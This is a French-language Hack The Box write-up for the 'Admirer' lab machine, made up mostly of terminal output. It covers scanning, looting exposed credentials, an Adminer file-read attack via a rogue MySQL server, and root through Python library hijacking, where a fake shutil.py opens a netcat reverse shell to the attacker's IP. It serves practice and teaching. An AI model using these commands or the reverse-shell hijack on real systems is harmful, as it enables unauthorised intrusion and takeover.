---
layout: post
title: HTB - Admirer
subtitle: Hack The Box - Linux Machine - Easy 
gh-repo: 0xSs0rZ/0xSs0rZ.github.io
gh-badge: [star]
tags: [HTB, Linux, Adminer, MySQL, shutil, Python, Python library hijacking]
comments: false
---

![Logo](/img/Admirer_logo.png){: .center-block :}

## 1. User

~~~
root@Host-001:~/Téléchargements# nmap -sC -sV 10.10.10.187
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-21 07:42 CEST
Nmap scan report for 10.10.10.187
Host is up (0.089s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.77 seconds
~~~

Directory enumeration:

~~~
root@Host-001:~/Téléchargements# dirb http://10.10.10.187

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu May 21 07:45:34 2020
URL_BASE: http://10.10.10.187/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.187/ ----
==> DIRECTORY: http://10.10.10.187/assets/                                     
==> DIRECTORY: http://10.10.10.187/images/                                     
+ http://10.10.10.187/index.php (CODE:200|SIZE:6051)                           
+ http://10.10.10.187/robots.txt (CODE:200|SIZE:138)                           
+ http://10.10.10.187/server-status (CODE:403|SIZE:277)   
~~~

http://10.10.10.187/robots.txt

~~~
User-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir
~~~

http://10.10.10.187/admin-dir/

~~~
Forbidden

You don't have permission to access this resource.
Apache/2.4.25 (Debian) Server at 10.10.10.187 Port 80
~~~

Nikto:

~~~
root@Host-001:~/Téléchargements# nikto -h http://10.10.10.187
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.187
+ Target Hostname:    10.10.10.187
+ Target Port:        80
+ Start Time:         2020-05-21 08:08:23 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" contains 1 entry which should be manually viewed.
+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7866 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2020-05-21 08:21:02 (GMT2) (759 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
~~~

Enumerons encore avec les extensions php, html et txt:

~~~
dirb http://IP/admin-dir -X .php,.html,.txt
~~~

On trouve http://10.10.10.187/admin-dir/contacts.txt

~~~
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
~~~

Enumeration avec une liste plus large:

~~~
root@Host-001:~/Téléchargements# dirb http://10.10.10.187/admin-dir /usr/share/wordlists/dirb/big.txt -X .php,.html,.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu May 21 10:41:00 2020
URL_BASE: http://10.10.10.187/admin-dir/
WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt
EXTENSIONS_LIST: (.php,.html,.txt) | (.php)(.html)(.txt) [NUM = 3]

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://10.10.10.187/admin-dir/ ----
+ http://10.10.10.187/admin-dir/contacts.txt (CODE:200|SIZE:350)                      
+ http://10.10.10.187/admin-dir/credentials.txt (CODE:200|SIZE:136) 
~~~

On visite http://10.10.10.187/admin-dir/credentials.txt

~~~
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
~~~

root@Host-001:~/Téléchargements# ftp 10.10.10.187
Connected to 10.10.10.187.
220 (vsFTPd 3.0.3)
Name (10.10.10.187:root): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02 21:24 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03 21:20 html.tar.gz
226 Directory send OK.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-x---    2 0        111          4096 Dec 03 21:21 .
drwxr-x---    2 0        111          4096 Dec 03 21:21 ..
-rw-r--r--    1 0        0            3405 Dec 02 21:24 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03 21:20 html.tar.gz
226 Directory send OK.
ftp> pwd
257 "/" is the current directory
ftp> get dump.sql
local: dump.sql remote: dump.sql
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for dump.sql (3405 bytes).
226 Transfer complete.
3405 bytes received in 0.00 secs (3.6527 MB/s)
ftp> get html.tar.gz
local: html.tar.gz remote: html.tar.gz
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for html.tar.gz (5270987 bytes).
226 Transfer complete.
5270987 bytes received in 5.57 secs (923.9123 kB/s)
ftp> bye
221 Goodbye.
root@Host-001:~/Téléchargements# 
~~~

html.tar.gz

~~~
root@Host-001:~/Bureau/htb/Admirer# tar -xzvf html.tar.gz 

root@Host-001:~/Bureau/htb/Admirer# cat index.php 
<!DOCTYPE HTML>
<!--
	Multiverse by HTML5 UP
	html5up.net | @ajlkn
	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
-->
<html>
	<head>
		<title>Admirer</title>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
		<link rel="stylesheet" href="assets/css/main.css" />
		<noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
	</head>
	<body class="is-preload">

		<!-- Wrapper -->
			<div id="wrapper">

				<!-- Header -->
					<header id="header">
						<h1><a href="index.html"><strong>Admirer</strong> of skills and visuals</a></h1>
						<nav>
							<ul>
								<li><a href="#footer" class="icon solid fa-info-circle">About</a></li>
							</ul>
						</nav>
					</header>

				<!-- Main -->
					<div id="main">			
					 <?php
                        $servername = "localhost";
                        $username = "waldo";
                        $password = "]F7jLHw:*G>UPrTo}~A"d6b";
                        $dbname = "admirerdb";

                        // Create connection
                        $conn = new mysqli($servername, $username, $password, $dbname);
                        // Check connection
                        if ($conn->connect_error) {
                            die("Connection failed: " . $conn->connect_error);
                        }

                        $sql = "SELECT * FROM items";
                        $result = $conn->query($sql);

                        if ($result->num_rows > 0) {
                            // output data of each row
                            while($row = $result->fetch_assoc()) {
                                echo "<article class='thumb'>";
    							echo "<a href='".$row["image_path"]."' class='image'><img src='".$row["thumb_path"]."' alt='' /></a>";
	    						echo "<h2>".$row["title"]."</h2>";
	    						echo "<p>".$row["text"]."</p>";
	    					    echo "</article>";
                            }
                        } else {
                            echo "0 results";
                        }
                        $conn->close();
                    ?>
					</div>

				<!-- Footer -->
					<footer id="footer" class="panel">
						<div class="inner split">
							<div>
								<section>
									<h2>Allow yourself to be amazed</h2>
									<p>Skills are not to be envied, but to feel inspired by.<br>
									Visual arts and music are there to take care of your soul.<br><br>
									Let your senses soak up these wonders...<br><br><br><br>
									</p>
								</section>
								<section>
									<h2>Follow me on ...</h2>
									<ul class="icons">
										<li><a href="#" class="icon brands fa-twitter"><span class="label">Twitter</span></a></li>
										<li><a href="#" class="icon brands fa-facebook-f"><span class="label">Facebook</span></a></li>
										<li><a href="#" class="icon brands fa-instagram"><span class="label">Instagram</span></a></li>
										<li><a href="#" class="icon brands fa-github"><span class="label">GitHub</span></a></li>
										<li><a href="#" class="icon brands fa-dribbble"><span class="label">Dribbble</span></a></li>
										<li><a href="#" class="icon brands fa-linkedin-in"><span class="label">LinkedIn</span></a></li>
									</ul>
								</section>
							</div>
							<div>
								<section>
									<h2>Get in touch</h2>
									<form method="post" action="#"><!-- Still under development... This does not send anything yet, but it looks nice! -->
										<div class="fields">
										<div class="field half">
										<input type="text" name="name" id="name" placeholder="Name" />
										</div>
										<div class="field half">
										<input type="text" name="email" id="email" placeholder="Email" />
										</div>
										<div class="field">
										<textarea name="message" id="message" rows="4" placeholder="Message"></textarea>
										</div>
										</div>
										<ul class="actions">
										<li><input type="submit" value="Send" class="primary" /></li>
										<li><input type="reset" value="Reset" /></li>
										</ul>
									</form>
								</section>
							</div>
						</div>
					</footer>

			</div>

		<!-- Scripts -->
			<script src="assets/js/jquery.min.js"></script>
			<script src="assets/js/jquery.poptrox.min.js"></script>
			<script src="assets/js/browser.min.js"></script>
			<script src="assets/js/breakpoints.min.js"></script>
			<script src="assets/js/util.js"></script>
			<script src="assets/js/main.js"></script>

	</body>
</html>

root@Host-001:~/Bureau/htb/Admirer/utility-scripts# cat admin_tasks.php 
<html>
<head>
  <title>Administrative Tasks</title>
</head>
<body>
  <h3>Admin Tasks Web Interface (v0.01 beta)</h3>
  <?php
  // Web Interface to the admin_tasks script
  // 
  if(isset($_REQUEST['task']))
  {
    $task = $_REQUEST['task'];
    if($task == '1' || $task == '2' || $task == '3' || $task == '4' ||
       $task == '5' || $task == '6' || $task == '7')
    {
      /*********************************************************************************** 
         Available options:
           1) View system uptime
           2) View logged in users
           3) View crontab (current user only)
           4) Backup passwd file (not working)
           5) Backup shadow file (not working)
           6) Backup web data (not working)
           7) Backup database (not working)

           NOTE: Options 4-7 are currently NOT working because they need root privileges.
                 I'm leaving them in the valid tasks in case I figure out a way
                 to securely run code as root from a PHP page.
      ************************************************************************************/
      echo str_replace("\n", "<br />", shell_exec("/opt/scripts/admin_tasks.sh $task 2>&1"));
    }
    else
    {
      echo("Invalid task.");
    }
  } 
  ?>

  <p>
  <h4>Select task:</p>
  <form method="POST">
    <select name="task">
      <option value=1>View system uptime</option>
      <option value=2>View logged in users</option>
      <option value=3>View crontab</option>
      <option value=4 disabled>Backup passwd file</option>
      <option value=5 disabled>Backup shadow file</option>
      <option value=6 disabled>Backup web data</option>
      <option value=7 disabled>Backup database</option>
    </select>
    <input type="submit">
  </form>
</body>
</html>
root@Host-001:~/Bureau/htb/Admirer/utility-scripts# 

root@Host-001:~/Bureau/htb/Admirer/utility-scripts# cat db_admin.php 
<?php
  $servername = "localhost";
  $username = "waldo";
  $password = "Wh3r3_1s_w4ld0?";

  // Create connection
  $conn = new mysqli($servername, $username, $password);

  // Check connection
  if ($conn->connect_error) {
      die("Connection failed: " . $conn->connect_error);
  }
  echo "Connected successfully";


  // TODO: Finish implementing this or find a better open source alternative
?>
~~~

dump.sql

~~~
root@Host-001:~/Bureau/htb/Admirer# cat dump.sql 
-- MySQL dump 10.16  Distrib 10.1.41-MariaDB, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: admirerdb
-- ------------------------------------------------------
-- Server version	10.1.41-MariaDB-0+deb9u1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `items`
--

DROP TABLE IF EXISTS `items`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `items` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `thumb_path` text NOT NULL,
  `image_path` text NOT NULL,
  `title` text NOT NULL,
  `text` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `items`
--

LOCK TABLES `items` WRITE;
/*!40000 ALTER TABLE `items` DISABLE KEYS */;
INSERT INTO `items` VALUES (1,'images/thumbs/thmb_art01.jpg','images/fulls/art01.jpg','Visual Art','A pure showcase of skill and emotion.'),(2,'images/thumbs/thmb_eng02.jpg','images/fulls/eng02.jpg','The Beauty and the Beast','Besides the technology, there is also the eye candy...'),(3,'images/thumbs/thmb_nat01.jpg','images/fulls/nat01.jpg','The uncontrollable lightshow','When the sun decides to play at night.'),(4,'images/thumbs/thmb_arch02.jpg','images/fulls/arch02.jpg','Nearly Monochromatic','One could simply spend hours looking at this indoor square.'),(5,'images/thumbs/thmb_mind01.jpg','images/fulls/mind01.jpg','Way ahead of his time','You probably still use some of his inventions... 500yrs later.'),(6,'images/thumbs/thmb_mus02.jpg','images/fulls/mus02.jpg','The outcomes of complexity','Seriously, listen to Dust in Interstellar\'s OST. Thank me later.'),(7,'images/thumbs/thmb_arch01.jpg','images/fulls/arch01.jpg','Back to basics','And centuries later, we want to go back and live in nature... Sort of.'),(8,'images/thumbs/thmb_mind02.jpg','images/fulls/mind02.jpg','We need him back','He might have been a loner who allegedly slept with a pigeon, but that brain...'),(9,'images/thumbs/thmb_eng01.jpg','images/fulls/eng01.jpg','In the name of Science','Some theories need to be proven.'),(10,'images/thumbs/thmb_mus01.jpg','images/fulls/mus01.jpg','Equal Temperament','Because without him, music would not exist (as we know it today).');
/*!40000 ALTER TABLE `items` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2019-12-02 20:24:15
root@Host-001:~/Bureau/htb/Admirer# 
~~~

Test des credentials pour ssh : fonctionne pas
Page de login pour Wordpress: fonctionne pas 

On lit le forum de HTB. Indice trouvé: le nom de la box a quelque chose à voir avec un outil utilisé pour les bases de données. On google et on trouve un outil appelé Adminer :) https://www.adminer.org/

On visite http://10.10.10.187/utility-scripts/adminer.php

On a une interface de Login pour Adminer 4.6.2

Exploit: [https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool)

1ere etape: créer un serveur mysql sur lequel on peux se connecter à distance

Ref: [https://doc.ubuntu-fr.org/mysql](https://doc.ubuntu-fr.org/mysql)

~~~
root@Host-001:~/Bureau/htb/Cache# mysql -u root
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 49
Server version: 10.3.22-MariaDB-1 Debian buildd-unstable

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> CREATE USER '0xSs0rZ'@'localhost' IDENTIFIED BY 'pass';
Query OK, 0 rows affected (0.002 sec)

MariaDB [(none)]> CREATE DATABASE test
    -> ;
Query OK, 1 row affected (0.001 sec)

MariaDB [(none)]> show databases
    -> ;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| test               |
+--------------------+
4 rows in set (0.001 sec)

MariaDB [(none)]> GRANT ALL ON *.* TO '0xSs0rZ'@'localhost';
Query OK, 0 rows affected (0.001 sec)

#Accepter les connections entrantes depuis n'importe ou
MariaDB [(none)]> GRANT ALL ON *.* TO '0xSs0rZ'@'%' IDENTIFIED BY 'pass';
Query OK, 0 rows affected (0.001 sec)

MariaDB [(none)]> FLUSH PRIVILEGES;
Query OK, 0 rows affected (0.001 sec)

MariaDB [(none)]> quit
Bye
root@Host-001:~/Bureau/htb/Admirer# vim /etc/mysql/mariadb.conf.d/50-server.cnf 
root@Host-001:~/Bureau/htb/Admirer# systemctl restart mysql
root@Host-001:~/Bureau/htb/Admirer# nmap 127.0.0.1 -p 3306
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-21 14:10 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000088s latency).

PORT     STATE SERVICE
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds
root@Host-001:~/Bureau/htb/Cache# 
~~~

http://10.10.10.187/utility-scripts/adminer.php?server=10.10.14.59&username=0xSs0rZ&db=test

On se connecte à Adminer avec les infos suivantes

~~~
System: MySQL
Server: IP TUN0 ex: 10.10.10.X
Username: 0xSs0rZ
Password: pass
Database: test
~~~

Creer une table 'test' dans la db 'test'

~~~
MariaDB [test]> CREATE table test(test VARCHAR(10000));
Query OK, 0 rows affected (0.293 sec)

MariaDB [test]> 
~~~

Dans Adminer, cliquer sur 'SQL Command' et executer la commande suivante:

~~~
load data local infile '../index.php'
into table test
fields terminated by '\n'
~~~

Dans select, on retrouve le contenu de index.php et on remarque que le mdp mysql n'est pas le même que celui qu'on a trouvé via ftp

~~~
$password = "&<h5b~yK3F#{PaPB&dA}{H>"; 
~~~

On se log a ssh avec ce mdp

~~~
root@Host-001:~/Bureau/htb/Admirer# ssh waldo@10.10.10.187
waldo@10.10.10.187's password: 
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Thu May 21 15:51:25 2020 from 10.10.14.137
waldo@admirer:~$ pwd
/home/waldo
You have new mail in /var/mail/waldo
waldo@admirer:~$ ls
experiment  user.txt
waldo@admirer:~$ cat user.txt 
aef3c0551337d3b44a63d0fcf902807d
waldo@admirer:~$
~~~

# 2 - Root

~~~
waldo@admirer:~$ sudo -l
[sudo] password for waldo: 
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
waldo@admirer:~$ cat /opt/scripts/admin_tasks.sh
#!/bin/bash

view_uptime()
{
    /usr/bin/uptime -p
}

view_users()
{
    /usr/bin/w
}

view_crontab()
{
    /usr/bin/crontab -l
}

backup_passwd()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_shadow()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_db()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running mysqldump in the background, it may take a while..."
        #/usr/bin/mysqldump -u root admirerdb > /srv/ftp/dump.sql &
        /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}



# Non-interactive way, to be used by the web interface
if [ $# -eq 1 ]
then
    option=$1
    case $option in
        1) view_uptime ;;
        2) view_users ;;
        3) view_crontab ;;
        4) backup_passwd ;;
        5) backup_shadow ;;
        6) backup_web ;;
        7) backup_db ;;

        *) echo "Unknown option." >&2
    esac

    exit 0
fi


# Interactive way, to be called from the command line
options=("View system uptime"
         "View logged in users"
         "View crontab"
         "Backup passwd file"
         "Backup shadow file"
         "Backup web data"
         "Backup DB"
         "Quit")

echo
echo "[[[ System Administration Menu ]]]"
PS3="Choose an option: "
COLUMNS=11
select opt in "${options[@]}"; do
    case $REPLY in
        1) view_uptime ; break ;;
        2) view_users ; break ;;
        3) view_crontab ; break ;;
        4) backup_passwd ; break ;;
        5) backup_shadow ; break ;;
        6) backup_web ; break ;;
        7) backup_db ; break ;;
        8) echo "Bye!" ; break ;;

        *) echo "Unknown option." >&2
    esac
done

exit 0
waldo@admirer:~$ cat /opt/scripts/backup.py
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
waldo@admirer:~$ 

waldo@admirer:~$ ls -la /opt/scripts/backup.py
-rwxr----- 1 root admins 198 Dec  2  2019 /opt/scripts/backup.py
waldo@admirer:~$ ls -la /opt/scripts/admin_tasks.sh 
-rwxr-xr-x 1 root admins 2613 Dec  2  2019 /opt/scripts/admin_tasks.sh
waldo@admirer:~$ 
~~~

On va hijacker la librairie shutil utilisée dans backup.py ref: [https://docs.python.org/3/library/shutil.html](https://docs.python.org/3/library/shutil.html)

Python library hijacking: [https://rastating.github.io/privilege-escalation-via-python-library-hijacking/](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/)

~~~
waldo@admirer:~$ python -c 'import sys; print "\n".join(sys.path)'

/usr/lib/python2.7
/usr/lib/python2.7/plat-x86_64-linux-gnu
/usr/lib/python2.7/lib-tk
/usr/lib/python2.7/lib-old
/usr/lib/python2.7/lib-dynload
/usr/local/lib/python2.7/dist-packages
/usr/lib/python2.7/dist-packages
waldo@admirer:~$ 
waldo@admirer:~$ python3 -c 'import sys; print ("\n".join(sys.path))'

/usr/lib/python35.zip
/usr/lib/python3.5
/usr/lib/python3.5/plat-x86_64-linux-gnu
/usr/lib/python3.5/lib-dynload
/usr/local/lib/python3.5/dist-packages
/usr/lib/python3/dist-packages
waldo@admirer:~$ 

aldo@admirer:~$ mkdir fakelib
waldo@admirer:~$ cd fakelib/
waldo@admirer:~/fakelib$ nano shutil.py
waldo@admirer:~/fakelib$ cat shutil.py 
import os

def make_archive(a, b, c):
    os.system("nc 10.10.14.100 1234 -e '/bin/sh'")
~~~

Dans un autre terminal ouvrir netcat a l'écoute sur le port 1234: `nc -nlvp 1234`

Lancer le script admin_tasks.sh, choisir l'option 6 pour appeler backup.py

~~~
waldo@admirer:~/fakelib$ sudo PYTHONPATH=~/fakelib /opt/scripts/admin_tasks.sh 

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
05) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 6
Running backup script in the background, it might take a while...
waldo@admirer:~/fakelib$ 
~~~

Dans netcat:

~~~
root@Host-001:~# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.100] from (UNKNOWN) [10.10.10.187] 55414
id
uid=0(root) gid=0(root) groups=0(root)
python -c "import pty; pty.spawn('/bin/bash')"
root@admirer:/home/waldo/fakelib# ls
ls
shutil.py
root@admirer:/home/waldo/fakelib# cd /root
cd /root
root@admirer:~# ls
ls
root.txt
root@admirer:~# cat root.txt
cat root.txt
79755c784590c99f6bd12f91c1104315
root@admirer:~# 
~~~

**Poursuivez avec :** 

[- HTB - Magic](https://0xss0rz.github.io/2020-08-24-HTB-Magic/)

[- HTB - Write Up Machine](https://0xss0rz.github.io/2020-08-04-HTB-Write-Up/)

[![CC-BY](https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/by.svg)](https://creativecommons.org/licenses/by/4.0/)

This work is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).
